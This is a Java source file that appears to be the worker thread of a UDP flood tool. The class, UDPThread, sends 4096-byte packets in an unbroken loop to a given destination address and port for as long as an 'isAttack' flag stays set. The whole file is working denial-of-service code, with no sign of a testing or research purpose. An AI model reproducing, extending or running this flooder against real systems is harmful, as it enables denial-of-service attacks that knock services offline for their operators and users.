import java.io.IOException;
import java.net.*;

public class UDPThread implements Runnable
{
    DatagramSocket ds;
    DatagramPacket dp;
    boolean isAttack, isReach;
    byte[] buf=new byte[8192];
    public UDPThread(InetAddress destination,int port)
    {
        isAttack = true;
        isReach = true;
        try
        {
            ds=new DatagramSocket();
        }
        catch (SocketException e)
        {
            e.printStackTrace();
        }
        dp=new DatagramPacket(buf,0,4096,destination,port);
    }
    @Override
    public void run()
    {
        synchronized(this)
        {
            if(isAttack==false)
                ds.close();
            else
            {
                while(isAttack==true && isReach==true)
                {
                    try
                    {
                        ds.send(dp);
                    }
                    catch (IOException e)
                    {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}